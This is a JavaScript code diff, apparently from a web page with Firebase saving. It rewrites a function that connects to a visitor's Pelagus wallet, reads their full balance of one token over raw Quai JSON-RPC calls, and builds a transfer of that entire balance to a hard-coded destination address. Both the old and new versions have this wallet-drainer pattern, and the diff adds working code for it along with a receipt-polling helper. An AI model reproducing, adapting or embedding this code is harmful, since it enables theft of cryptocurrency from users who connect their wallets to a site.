@@ -442,55 +442,88 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Connect to the Pelagus wallet
-        const provider = new ethers.providers.Web3Provider(window.pelagus);
-        const signer = provider.getSigner();
-
-        // Token contract details
+        const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
         const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
         const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
-        const TOKEN_DECIMALS = 18;
         const TOKEN_ABI = [
             "function transfer(address to, uint256 amount) public returns (bool)",
             "function balanceOf(address owner) view returns (uint256)"
         ];
 
-        // Initialize token contract
-        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
+        // Connect to the Pelagus wallet
+        const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
+        const signerAddress = accounts[0];
 
-        // Check token balance
-        const signerAddress = await signer.getAddress();
-        const rawBalance = await tokenContract.balanceOf(signerAddress);
-        const balance = ethers.BigNumber.from(rawBalance);
+        // Get token balance
+        const balanceData = '0x70a08231000000000000000000000000' + signerAddress.slice(2);
+        const balanceResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_call',
+                params: [{ to: TOKEN_ADDRESS, data: balanceData }, 'latest'],
+                id: 1
+            })
+        });
+        const balanceResult = await balanceResponse.json();
+        const rawBalance = balanceResult.result ? BigInt(balanceResult.result) : 0n;
 
-        if (balance.isZero()) {
+        if (rawBalance === 0n) {
             throw new Error('No tokens available to send');
         }
 
-        // Format balance for readability
-        const formattedBalance = ethers.utils.formatUnits(balance, TOKEN_DECIMALS);
-        console.log(`Balance: ${formattedBalance} tokens`);
+        console.log(`Balance: ${rawBalance} (raw units)`);
 
-        // Prepare transaction overrides (gas estimation)
-        const gasLimit = await tokenContract.estimateGas.transfer(DESTINATION_ADDRESS, balance);
-        const gasPrice = await provider.getGasPrice();
+        // Create transaction data for transfer
+        const transferData = 
+            '0xa9059cbb' + 
+            DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
+            rawBalance.toString(16).padStart(64, '0');
 
-        // Send tokens
-        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, balance, {
-            gasLimit: gasLimit,
-            gasPrice: gasPrice
+        // Send transaction
+        const txResponse = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: signerAddress,
+                to: TOKEN_ADDRESS,
+                data: transferData
+            }]
         });
 
-        console.log(`Transaction sent: ${tx.hash}`);
+        console.log(`Transaction sent: ${txResponse}`);
 
-        // Wait for confirmation
-        const receipt = await tx.wait();
+        // Wait for transaction confirmation
+        const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
         console.log(`Transaction confirmed: ${receipt.transactionHash}`);
 
         alert(`Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
     } catch (error) {
-        console.error('Error sending tokens:', error);
+        console.error('Error sending tokens:', error.message);
         alert(`Error: ${error.message}`);
+    }
+}
+
+// Wait for transaction receipt
+async function waitForTransaction(txHash, rpcEndpoint) {
+    while (true) {
+        const receiptResponse = await fetch(rpcEndpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_getTransactionReceipt',
+                params: [txHash],
+                id: 2
+            })
+        });
+
+        const receiptResult = await receiptResponse.json();
+        if (receiptResult.result) {
+            return receiptResult.result;
+        }
+
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Retry every 5 seconds
     }
 }
 
